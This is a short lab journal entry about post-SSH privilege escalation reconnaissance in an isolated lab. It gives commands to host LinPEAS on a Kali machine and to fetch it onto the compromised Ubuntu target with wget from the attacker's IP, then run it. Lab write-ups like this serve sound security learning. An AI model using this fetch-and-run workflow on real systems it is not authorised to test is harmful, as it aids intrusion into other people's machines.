🔍 Day 7: Privilege Escalation Recon
📝 Executive Summary

Today I focused on what comes after gaining SSH access: identifying potential paths to escalate privileges.
I used LinPEAS, a well-known Linux privilege escalation enumerator, to map weaknesses across the target system.

This phase is not exploitation, but reconnaissance — understanding the security posture from an attacker’s perspective.

🛠️ Lab Setup
Component	Role
Kali Linux	Attacker Host (File Transfer + Enumeration Tools)
Ubuntu Target	Compromised Host (SSH access established)
Network	Host-Only (Isolated - No external routing)
⚙️ Actions Performed
1. Tool Hosting on Kali
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 80

2. Download on Target
cd /tmp
wget http://192.168.160.130/linpeas.sh
chmod +x linpeas.sh

3. Execute
./linpeas.sh
